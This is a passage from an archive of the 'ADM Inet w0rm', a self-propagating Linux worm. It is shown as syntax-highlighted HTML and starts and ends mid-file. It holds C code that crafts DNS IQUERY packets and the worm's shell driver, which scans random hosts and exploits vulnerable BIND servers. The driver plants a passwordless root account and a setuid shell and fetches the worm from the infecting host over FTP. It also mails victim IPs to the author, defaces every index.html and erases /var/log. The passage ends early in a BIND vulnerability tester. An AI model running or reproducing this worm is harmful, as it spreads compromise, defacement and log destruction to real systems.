  </span><span class="sc11">dnsh</span><span class="sc10">-&gt;</span><span class="sc11">opcode</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">IQUERY</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">dnsh</span><span class="sc10">-&gt;</span><span class="sc11">aa</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">dnsh</span><span class="sc10">-&gt;</span><span class="sc11">tc</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">dnsh</span><span class="sc10">-&gt;</span><span class="sc11">rd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">dnsh</span><span class="sc10">-&gt;</span><span class="sc11">ra</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">dnsh</span><span class="sc10">-&gt;</span><span class="sc11">unused</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc1">/* removed for portability (it's zero already)
   dnsh-&gt;pr             = 0;
 */</span><span class="sc0">
  </span><span class="sc11">dnsh</span><span class="sc10">-&gt;</span><span class="sc11">rcode</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">dnsh</span><span class="sc10">-&gt;</span><span class="sc11">qdcount</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">dnsh</span><span class="sc10">-&gt;</span><span class="sc11">ancount</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">dnsh</span><span class="sc10">-&gt;</span><span class="sc11">nscount</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">dnsh</span><span class="sc10">-&gt;</span><span class="sc11">arcount</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">pktlen</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">HEADER</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">ptr</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">HEADER</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc1">/* this is the domain name (nothing here) */</span><span class="sc0">
  </span><span class="sc10">*(</span><span class="sc11">ptr</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'\0'</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">pktlen</span><span class="sc10">++;</span><span class="sc0">
</span><span class="sc1">/* fill out the rest of the rr */</span><span class="sc0">

  </span><span class="sc11">PUTSHORT</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">T_A</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ptr</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">PUTSHORT</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">C_IN</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ptr</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">PUTLONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ttl</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ptr</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">PUTSHORT</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">strlen</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">ptr</span><span class="sc10">);</span><span class="sc0">

  </span><span class="sc11">memcpy</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">ptr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ptr</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strlen</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">

  </span><span class="sc11">pktlen</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">short</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">long</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strlen</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">));</span><span class="sc0">

  </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">pktlen</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0">
</span><span class="sc11">send_packet</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pktbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pktlen</span><span class="sc10">)</span><span class="sc0">
     </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">sd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pktlen</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pktbuf</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">tmp</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">tmpptr</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc11">tmpptr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">tmp</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">PUTSHORT</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">pktlen</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">tmpptr</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">write</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">tmp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">write</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pktbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pktlen</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">pktlen</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc11">perror</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc6">"write failed"</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">w0rm</span><span class="sc10">/</span><span class="sc11">ADMw0rm</span><span class="sc0"></span><span class="sc4">100755</span><span class="sc0">      </span><span class="sc4">0</span><span class="sc0">      </span><span class="sc4">0</span><span class="sc0">        </span><span class="sc4">3275</span><span class="sc0">  </span><span class="sc4">6526727424</span><span class="sc0">  </span><span class="sc4">11204</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"></span><span class="sc11">ustar</span><span class="sc0">  </span><span class="sc11">root</span><span class="sc0"></span><span class="sc11">root</span><span class="sc0">#</span><span class="sc10">!</span><span class="sc14">/bin/sh</span><span class="sc0">
</span><span class="sc9"># ADM Inet w0rm 
# Linux X86 spef..  anyway it's my first w0rm :)
# ver 0.1
# i'm not responsable of the usage of diz w0rm !!! 
# greetz: to  all blondes with the short hairs who look's good =), the netg 
# sistah, all of the handrail's i'll slide, all of the sweden chix i'll fuk ;) 
# and The ADM Crew oooooooofffffff course heh
#          LIFE IS A BITCH, BE HARDCORE WITH 'EM, DONT FINISH LIKE ME !
# ********************* THE CREW WILL NEVER DIE ***************************
</span><span class="sc0">
</span><span class="sc11">EMAIL</span><span class="sc10">=</span><span class="sc6">"admsmb@hotmail.com"</span><span class="sc0"> 
</span><span class="sc11">SAY</span><span class="sc10">=</span><span class="sc6">"The ADM Inet w0rm is here !"</span><span class="sc0">
</span><span class="sc11">PATH</span><span class="sc10">=</span><span class="sc6">"/bin/:/usr/sbin/:/usr/bin:/sbin:/usr/local/bin:."</span><span class="sc0">
</span><span class="sc11">export</span><span class="sc0"> </span><span class="sc11">PATH</span><span class="sc0">


</span><span class="sc11">IP_A</span><span class="sc10">=</span><span class="sc0">`</span><span class="sc10">./</span><span class="sc11">gimmeIP</span><span class="sc0">`

</span><span class="sc11">cat</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc11">_EOF_</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc11">cmd</span><span class="sc0">
</span><span class="sc11">w0rm</span><span class="sc0">
</span><span class="sc10">/</span><span class="sc11">tmp</span><span class="sc10">/.</span><span class="sc11">w0rm</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc11">c</span><span class="sc0"> </span><span class="sc6">"/usr/sbin/named"</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc11">PATH</span><span class="sc10">=</span><span class="sc6">"/bin/:/usr/sbin/:/usr/bin:/sbin:/usr/local/bin:."</span><span class="sc0">
</span><span class="sc11">export</span><span class="sc0"> </span><span class="sc11">PATH</span><span class="sc0">
</span><span class="sc11">echo</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc11">e</span><span class="sc0"> </span><span class="sc6">"&lt;html&gt; &lt;body&gt;\n$SAY\n &lt;\html&gt; &lt;\\\body&gt;"</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc11">tmp</span><span class="sc10">/.</span><span class="sc11">X11x</span><span class="sc0">
</span><span class="sc11">cd</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc11">tmp</span><span class="sc10">/</span><span class="sc0">
</span><span class="sc11">mkdir</span><span class="sc0"> </span><span class="sc10">.</span><span class="sc11">w0rm0r</span><span class="sc0">
</span><span class="sc11">cd</span><span class="sc0"> </span><span class="sc10">.</span><span class="sc11">w0rm0r</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">[</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc11">f</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc11">tmp</span><span class="sc10">/</span><span class="sc11">w0rmishere</span><span class="sc0"> </span><span class="sc10">]</span><span class="sc0">
</span><span class="sc11">then</span><span class="sc0">
</span><span class="sc11">nohup</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc11">tmp</span><span class="sc10">/.</span><span class="sc11">w0rm</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc11">c</span><span class="sc0"> </span><span class="sc6">"/bin/sleep 60;/bin/rm -rf /var/log/* /tmp/.w0rm"</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc11">logout</span><span class="sc0">
</span><span class="sc11">fi</span><span class="sc0">
</span><span class="sc11">ftp</span><span class="sc0"> </span><span class="sc11">$IP_A</span><span class="sc0">
</span><span class="sc11">w0rm</span><span class="sc0">

</span><span class="sc11">cd</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc11">tmp</span><span class="sc10">/.</span><span class="sc11">w0rm0r</span><span class="sc0">
</span><span class="sc11">get</span><span class="sc0"> </span><span class="sc11">ADMw0rm</span><span class="sc10">.</span><span class="sc11">tgz</span><span class="sc0">
</span><span class="sc11">bye</span><span class="sc0">
</span><span class="sc11">tar</span><span class="sc0"> </span><span class="sc11">xfvz</span><span class="sc0"> </span><span class="sc11">ADMw0rm</span><span class="sc10">.</span><span class="sc11">tgz</span><span class="sc0">
</span><span class="sc11">touch</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc11">tmp</span><span class="sc10">/</span><span class="sc11">w0rmishere</span><span class="sc0">
</span><span class="sc11">nohup</span><span class="sc0"> </span><span class="sc10">./</span><span class="sc11">ADMw0rm</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">gimmeIP</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc14">/bin/mail</span><span class="sc0"> </span><span class="sc11">$EMAIL</span><span class="sc0">
</span><span class="sc11">nohup</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc11">tmp</span><span class="sc10">/.</span><span class="sc11">w0rm</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc11">c</span><span class="sc0"> </span><span class="sc6">"/bin/sleep 60;/bin/rm -rf /var/log/* /tmp/.w0rm"</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc11">nohup</span><span class="sc0"> </span><span class="sc11">find</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc11">name</span><span class="sc0"> </span><span class="sc6">"index.html"</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc11">exec</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc11">bin</span><span class="sc10">/</span><span class="sc11">cp</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc11">tmp</span><span class="sc10">/.</span><span class="sc11">X11x</span><span class="sc0"> </span><span class="sc10">{}</span><span class="sc0"> \</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc11">logout</span><span class="sc0">
</span><span class="sc11">_EOF_</span><span class="sc0">


</span><span class="sc10">./</span><span class="sc11">gimmeRAND</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">./</span><span class="sc11">incremental</span><span class="sc0">  </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">./</span><span class="sc11">scanco</span><span class="sc0">  </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc11">read</span><span class="sc0"> </span><span class="sc11">VICTIM</span><span class="sc0">
</span><span class="sc5">do</span><span class="sc0">
</span><span class="sc11">RESU</span><span class="sc10">=</span><span class="sc0">`</span><span class="sc10">./</span><span class="sc11">test</span><span class="sc0"> </span><span class="sc11">$VICTIM</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc11">dev</span><span class="sc10">/</span><span class="sc11">null</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">awk</span><span class="sc0"> </span><span class="sc7">'{printf("%s",$3)}'</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc11">dev</span><span class="sc10">/</span><span class="sc11">null</span><span class="sc0">`

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">[</span><span class="sc0"> </span><span class="sc11">$RESU</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"vulnerable."</span><span class="sc0"> </span><span class="sc10">]</span><span class="sc0">
</span><span class="sc11">then</span><span class="sc0"> 

</span><span class="sc11">echo</span><span class="sc0"> </span><span class="sc6">"lets hack"</span><span class="sc0"> 
</span><span class="sc10">./</span><span class="sc11">Hnamed</span><span class="sc0"> </span><span class="sc11">$VICTIM</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc11">bin</span><span class="sc10">/</span><span class="sc11">sh</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc11">c</span><span class="sc0"> </span><span class="sc6">"echo &gt;&gt; /etc/passwd; echo \"w0rm::2666:777:ADM Inet w0rm:/:/bin/sh\" &gt;&gt; /etc/passwd; /bin/cp /bin/sh /tmp/.w0rm; /bin/chmod 4777 /tmp/.w0rm; /bin/rm -f /etc/hosts.deny"</span><span class="sc0">             
</span><span class="sc11">nohup</span><span class="sc0"> </span><span class="sc10">./</span><span class="sc11">remotecmd</span><span class="sc0"> </span><span class="sc11">$VICTIM</span><span class="sc0"> </span><span class="sc11">cmd</span><span class="sc0"> </span><span class="sc4">3000000</span><span class="sc0">  </span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc11">fi</span><span class="sc0">
</span><span class="sc11">done</span><span class="sc0"> 
 </span><span class="sc11">w0rm</span><span class="sc10">/</span><span class="sc11">testvuln</span><span class="sc10">.</span><span class="sc11">c</span><span class="sc0"></span><span class="sc4">100644</span><span class="sc0">      </span><span class="sc4">0</span><span class="sc0">      </span><span class="sc4">0</span><span class="sc0">       </span><span class="sc4">10313</span><span class="sc0">  </span><span class="sc4">6525363364</span><span class="sc0">  </span><span class="sc4">12104</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"></span><span class="sc11">ustar</span><span class="sc0">  </span><span class="sc11">root</span><span class="sc0"></span><span class="sc11">root</span><span class="sc0"></span><span class="sc1">/*
   tests if vulnerable to overflow for bind (pre 8.1.2 / 4.9.8) named
   nameserver must have fake-iquery option turned on
   written solely by Joshua J. Drake (jdrake@pulsar.net)
*/</span><span class="sc0">

</span><span class="sc1">/* local type includes */</span><span class="sc0">
</span><span class="sc9">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;signal.h&gt;
#include &lt;time.h&gt;
#include &lt;string.h&gt;
#include &lt;ctype.h&gt;
</span><span class="sc1">/* network type includes */</span><span class="sc0">
</span><span class="sc9">#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;arpa/nameser.h&gt;
#include &lt;netdb.h&gt;
</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">handle_alarm</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">lookup_host</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">attack_bind</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">make_keypkt</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">send_packet</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">get_packet</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">vulnerable</span><span class="sc10">();</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0">
</span><span class="sc11">main</span><span class="sc10">(</span><span class="sc11">argc</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">argv</span><span class="sc10">)</span><span class="sc0">
   </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">argc</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">argv</span><span class="sc10">[];</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
   </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr_in</span><span class="sc0"> </span><span class="sc11">ra</span><span class="sc10">;</span><span class="sc0">

   </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">argc</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0">
     </span><span class="sc10">{</span><span class="sc0">
       </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"usage: %s &lt;host&gt;\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]);</span><span class="sc0">
       </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc10">}</span><span class="sc0">
   </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">lookup_host</span><span class="sc10">(&amp;</span><span class="sc11">ra</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">NAMESERVER_PORT</span><span class="sc10">))</span><span class="sc0">
      </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc11">srand</span><span class="sc10">(</span><span class="sc11">time</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">));</span><span class="sc0">
   </span><span class="sc11">attack_bind</span><span class="sc10">(</span><span class="sc11">ra</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0">
</span><span class="sc11">lookup_host</span><span class="sc10">(</span><span class="sc11">ra</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">hn</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">rp</span><span class="sc10">)</span><span class="sc0">
   </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr_in</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">ra</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">hn</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">short</span><span class="sc0"> </span><span class="sc11">rp</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
   </span><span class="sc11">ra</span><span class="sc10">-&gt;</span><span class="sc11">sin_family</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">AF_INET</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc11">ra</span><span class="sc10">-&gt;</span><span class="sc11">sin_port</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc11">rp</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">ra</span><span class="sc10">-&gt;</span><span class="sc11">sin_addr</span><span class="sc10">.</span><span class="sc11">s_addr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">inet_addr</span><span class="sc10">(</span><span class="sc11">hn</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
     </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">hostent</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">he</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">he</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">gethostbyname</span><span class="sc10">(</span><span class="sc11">hn</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">hostent</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
      </span><span class="sc10">{</span><span class="sc0">
         </span><span class="sc11">memcpy</span><span class="sc10">(&amp;</span><span class="sc11">ra</span><span class="sc10">-&gt;</span><span class="sc11">sin_addr</span><span class="sc10">.</span><span class="sc11">s_addr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">he</span><span class="sc10">-&gt;</span><span class="sc11">h_addr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">);</span><span class="sc0">
         </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">else</span><span class="sc0">
       </span><span class="sc11">herror</span><span class="sc10">(</span><span class="sc6">"Unable to resolve hostname"</span><span class="sc10">);</span><span class="sc0">
     </span><span class="sc10">}</span><span class="sc0">
   </span><span class="sc5">else</span><span class="sc0">
      </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0">
</span><span class="sc11">attack_bind</span><span class="sc10">(</span><span class="sc11">ra</span><span class="sc10">)</span><span class="sc0">
   </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr_in</span><span class="sc0"> </span><span class="sc11">ra</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
   </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">sd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pktlen</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">keypkt</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">inbuf</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">rname</span><span class="sc10">[</span><span class="sc4">256</span><span class="sc10">];</span><span class="sc0">
   </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">hostent</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">he</span><span class="sc10">;</span><span class="sc0">

   </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">sd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">socket</span><span class="sc10">(</span><span class="sc11">AF_INET</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SOCK_STREAM</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
     </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">perror</span><span class="sc10">(</span><span class="sc6">"cannot open tcp socket"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc10">}</span><span class="sc0">
   
   </span><span class="sc11">fflush</span><span class="sc10">(</span><span class="sc11">stdout</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc11">signal</span><span class="sc10">(</span><span class="sc11">SIGALRM</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">handle_alarm</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc11">alarm</span><span class="sc10">(</span><span class="sc4">15</span><span class="sc10">);</span><span class="sc0">
